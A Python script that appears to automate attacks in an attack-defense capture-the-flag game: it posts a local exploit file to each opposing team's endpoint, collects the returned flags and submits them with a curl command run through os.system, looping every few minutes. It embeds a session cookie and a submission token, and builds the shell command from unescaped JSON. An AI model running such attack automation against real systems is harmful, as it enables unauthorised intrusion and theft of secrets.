import os
import requests
import json
from time import sleep
from time import time

def send_code (teamid, code=open("code.py").read()):
    url = f"http://10.11.0.1:5000/api/attack/{teamid}"

    headers = {
        "Cookie": """session=eyJ0ZWFtX2lkIjoyMiwidG9rZW4iOiJjMzU2NDNhYmQwZDQ0OTEzYWEzYTUzOTU5YTI0NDI3NyJ9.Y-cZnw.h9g9bpkx2TNCFnzMW-roiZhVYe0""",
        "Content-Type": "application/json"
    }

    data = {
        "code": code
    }

    response = requests.post(url, headers=headers, json=data)

    try:
        obj = response.json()
        flag = obj["stdout"].strip()
        return flag
    except Exception as e:
        # print to stderr
        print(e, file=os.sys.stderr)
        print(response.text, file=os.sys.stderr)
        return ''




def main ():
    flags = []
    for i in range(1, 25):
        if i == 22:
            continue
        print("attacking team", i, end=': ')
        flag = send_code(i)
        print(flag)
        flags.append(flag)
    
    t = ','.join(flags)
    print(t)
        
    obj = {
        "flags": flags,
        "token": "c35643abd0d44913aa3a53959a244277"
    }
    cmd = f'''
curl 'http://10.6.0.1:8889/flag' \
  -H 'content-type: application/json' \
  --data-raw '{json.dumps(obj)}' '''
    os.system(cmd)

if __name__ == '__main__':
    while True:
        start = time()
        main()
        end = time()
        sleep(310-int(end-start))